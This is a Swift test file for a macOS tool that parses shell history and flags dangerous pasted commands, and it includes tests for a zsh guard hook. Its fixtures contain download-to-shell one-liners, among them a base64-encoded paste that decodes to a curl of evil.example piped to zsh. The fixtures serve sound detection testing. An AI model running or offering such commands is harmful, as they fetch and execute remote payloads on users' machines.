import Foundation
import Testing

@testable import MacxCore

@Suite("Shell history parsing")
struct ShellHistoryTests {
    @Test func zshExtendedHistoryWithTimesAndMultilineCommands() {
        let text = ": 1787354773:0;gh auth login\n: 1787354800:2;echo one \\\ntwo\n: 1787354900:0;ls\n"
        let entries = ShellHistory.parseZsh(Data(text.utf8), file: "/h/.zsh_history")
        #expect(entries.map(\.command) == ["gh auth login", "echo one \\\ntwo", "ls"])
        #expect(entries[0].date == Date(timeIntervalSince1970: 1_787_354_773))
        #expect(entries[2].line == 4)
    }

    @Test func zshPlainHistoryHasNoTimes() {
        let entries = ShellHistory.parseZsh(Data("ls\ncd /tmp\n".utf8), file: "f")
        #expect(entries.map(\.command) == ["ls", "cd /tmp"])
        #expect(entries.allSatisfy { $0.date == nil })
    }

    @Test func zshMetafiedBytesAreDecoded() {
        // zsh stores some bytes as 0x83 followed by the byte XOR 32. "é" is C3 A9; A9 isn't special, but
        // bytes 0x83-0x9F and 0x00 are. Here 0x83 0xA3 decodes to 0x83.
        let data = Data([0x3A, 0x20, 0x31, 0x3A, 0x30, 0x3B, 0x65, 0x63, 0x68, 0x6F, 0x20, 0xE2, 0x83, 0xA2, 0xAC, 0x0A])
        let entries = ShellHistory.parseZsh(data, file: "f")
        #expect(entries.first?.command == "echo €")
    }

    @Test func bashHistoryWithOptionalTimestamps() {
        let entries = ShellHistory.parseBash("#1787354773\ncurl -s https://x | bash\nls\n", file: "f")
        #expect(entries.map(\.command) == ["curl -s https://x | bash", "ls"])
        #expect(entries[0].date == Date(timeIntervalSince1970: 1_787_354_773))
        #expect(entries[1].date == nil)
    }

    @Test func fishHistory() {
        let text = "- cmd: curl -s https://x | sh\n  when: 1787354773\n- cmd: ls\n  when: 1787354800\n  paths:\n    - /tmp\n"
        let entries = ShellHistory.parseFish(text, file: "f")
        #expect(entries.map(\.command) == ["curl -s https://x | sh", "ls"])
        #expect(entries[1].date == Date(timeIntervalSince1970: 1_787_354_800))
    }

    @Test func findsHistoryFilesIncludingTerminalSessions() throws {
        let tmp = try TempDir()
        try tmp.file(".zsh_history", ": 1:0;ls\n")
        try tmp.file(".zsh_sessions/ABC.history", ": 2:0;pwd\n")
        try tmp.file(".zsh_sessions/ABC.session", "echo restore")
        try tmp.file(".bash_history", "ls\n")
        try tmp.file(".local/share/fish/fish_history", "- cmd: ls\n  when: 3\n")
        let files = ShellHistory.files(home: tmp.url, environment: [:]).map { $0.url.lastPathComponent }.sorted()
        #expect(files == [".bash_history", ".zsh_history", "ABC.history", "fish_history"])
    }

    @Test func honoursHISTFILE() throws {
        let tmp = try TempDir()
        let custom = try tmp.file("hist/my_history", ": 1:0;ls\n")
        let files = ShellHistory.files(home: tmp.url, environment: ["HISTFILE": custom.path])
        #expect(files.contains { $0.url == custom && $0.shell == .zsh })
    }
}

@Suite("Paste guard")
struct PasteGuardTests {
    @Test func flagsTheAMOSPasteAndDecodesIt() {
        let cmd = "echo 'Y3VybCAtc0wgaHR0cHM6Ly9ldmlsLmV4YW1wbGUveC5zaCB8IHpzaA==' | base64 -D | zsh"
        let result = PasteGuard.check(cmd)
        #expect(result.isDangerous)
        #expect(result.patterns.contains(.base64ToShell))
        #expect(result.decoded == ["curl -sL https://evil.example/x.sh | zsh"])
        // The decoded command is checked too.
        #expect(result.patterns.contains(.downloadToShell))
    }

    @Test func normalCommandsPass() {
        for cmd in [
            "ls -la", "brew install wget", "git push origin dev", "curl -o x.zip https://example.com/x.zip",
            "eval \"$(/opt/homebrew/bin/brew shellenv)\"",
        ] {
            #expect(!PasteGuard.check(cmd).isDangerous, "\(cmd)")
        }
    }

    @Test func historyScanReturnsOnlyHits() throws {
        let tmp = try TempDir()
        try tmp.file(
            ".zsh_history",
            ": 1787354773:0;ls\n: 1787355484:0;echo 'Y3VybCAtc0wgaHR0cHM6Ly9ldmlsLmV4YW1wbGUveC5zaCB8IHpzaA==' | base64 -D | zsh\n")
        let hits = PasteGuard.scanHistory(home: tmp.url, environment: [:])
        #expect(hits.count == 1)
        #expect(hits[0].entry.date == Date(timeIntervalSince1970: 1_787_355_484))
        #expect(hits[0].result.decoded.first?.contains("evil.example") == true)
    }
}

@Suite("zsh guard hook")
struct GuardHookTests {
    @Test func installAddsOneMarkedBlockAndUninstallRemovesIt() throws {
        let tmp = try TempDir()
        try tmp.file(".zshrc", "export A=1\n")
        let hook = GuardHook(home: tmp.url, macxPath: "/usr/local/bin/macx")
        #expect(!hook.isInstalled)
        try hook.install()
        try hook.install()  // twice is the same as once
        let rc = try tmp.read(".zshrc")
        #expect(rc.components(separatedBy: GuardHook.beginMarker).count == 2)
        #expect(rc.hasPrefix("export A=1\n"))
        #expect(hook.isInstalled)
        #expect(tmp.exists(".config/macximesed/guard.zsh"))

        try hook.uninstall()
        #expect(try tmp.read(".zshrc") == "export A=1\n")
        #expect(!tmp.exists(".config/macximesed/guard.zsh"))
        #expect(!hook.isInstalled)
    }

    @Test func respectsZDOTDIR() throws {
        let tmp = try TempDir()
        let zdot = tmp.url.appendingPathComponent("zdot")
        try FileManager.default.createDirectory(at: zdot, withIntermediateDirectories: true)
        let hook = GuardHook(home: tmp.url, macxPath: "/x/macx", zdotdir: zdot)
        try hook.install()
        #expect(tmp.exists("zdot/.zshrc"))
        #expect(!tmp.exists(".zshrc"))
    }

    @Test func generatedScriptIsValidZsh() throws {
        let tmp = try TempDir()
        let hook = GuardHook(home: tmp.url, macxPath: "/usr/local/bin/macx")
        try hook.install()
        let script = tmp.url.appendingPathComponent(".config/macximesed/guard.zsh").path
        guard FileManager.default.isExecutableFile(atPath: "/bin/zsh") else { return }
        let r = ProcessRunner.capture("/bin/zsh", ["-n", script])
        #expect(r?.status == 0, "\(r?.stderr ?? "")")
    }
}
